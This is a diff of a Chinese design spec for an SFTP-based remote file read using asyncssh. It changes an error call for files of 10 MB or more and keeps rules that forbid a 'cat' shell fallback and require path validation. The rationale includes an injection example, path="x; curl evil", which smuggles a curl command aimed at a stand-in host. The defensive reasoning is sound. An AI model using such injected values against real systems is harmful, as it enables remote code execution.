@@ -120,7 +120,7 @@
 
 - 仅用 asyncssh SFTP（`async with conn.start_sftp_client() as sftp: ...`）
 - SFTP 不可用（远端禁用 sftp-server subsystem）时 raise `TargetError(kind="sftp_unavailable", target=name)`；**禁止** fallback 到 `cat <path>` shell 命令（理由：`cat` fallback 含 (a) shell 命令注入风险——`path="x; curl evil"` 直接 RCE；(b) 二进制内容经 shell stdout 可能被截断或编码变换，破坏字节完整性；(c) 大文件无法在读到 10MB 时主动中断）
-- 文件 ≥10 MB 时 raise `TargetError("file_too_large", path=path, size=size)`，**不**返回部分内容
+- 文件 ≥10 MB 时 raise `TargetError(kind="file_too_large", target=self.name, path=path, size=size)`，**不**返回部分内容
 - 文件不存在 raise `FileNotFoundError`（标准库异常，不包装）
 - path 参数即使是合法 SFTP 路径，也必须经过 `pathlib.PurePosixPath` 校验（拒绝含 NUL 字节 / 换行 / 含 `..` 的相对路径）
 
